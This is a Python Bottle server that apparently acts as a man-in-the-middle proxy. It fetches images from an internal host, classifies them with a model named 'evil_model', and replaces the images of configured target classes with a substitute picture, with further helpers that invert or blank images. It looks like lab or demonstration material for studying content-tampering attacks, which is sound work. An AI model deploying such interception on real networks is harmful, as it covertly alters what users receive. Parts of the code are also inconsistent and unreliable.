from bottle import route, response, run
from ruamel.yaml import YAML

import cv2
import torch
import httpx
import numpy as np

from model import ResNet18
from model import FakeModel

evil_model = ResNet18()


def has_class_over_threshold(df):
    hcot = False
    intersected = set(df["name"].tolist()).intersection(class_names)
    if len(intersected) > 0:
        for idx, row in df[df["name"].isin(intersected)].iterrows():
            if row["confidence"] >= cfg["target_classes"][row["name"]]:
                hcot = True
                break

    return hcot


def invert_img(image):
    image = cv2.bitwise_not(image)
    neg_bytes = cv2.imencode(".jpg", image)[1].tostring()
    return neg_bytes


def obliterate_img(image):
    image = np.zeros((32, 32, 3), np.uint8)
    return cv2.imencode(".jpg", image)[1].tostring()

def replace_img(image):
    with open("images/click.png", "rb") as img_file:
        image_bytes = img_file.read()
    return image_bytes


def read_config():
    with open("/config/config.yaml", "r") as cfg_file:
        yaml = YAML(typ="safe")
        cfg = yaml.load(cfg_file)
    return cfg


@route("/image/<position:int>")
def moditm(position):
    server_ip = "192.168.1.222"
    forwarding_uri = f"http://{server_ip}/image/{position}"
    resp = httpx.get(forwarding_uri)
    img_bytes = resp.content

    image = np.asarray(bytearray(img_bytes), dtype="uint8")
    image = cv2.imdecode(image, cv2.IMREAD_COLOR)
    image = torch.from_numpy(image.transpose(2, 1, 0)).unsqueeze(0).type(torch.float32)
    result = evil_model.detect(image)

    if not result.empty and has_class_over_threshold(result):
        img_bytes = replace_img(image)
    response.set_header("Content-type", "image/jpeg")
    return img_bytes


cfg = read_config()
class_names = set(cfg["target_classes"].keys())

run(host="0.0.0.0", port=5000, debug=True)
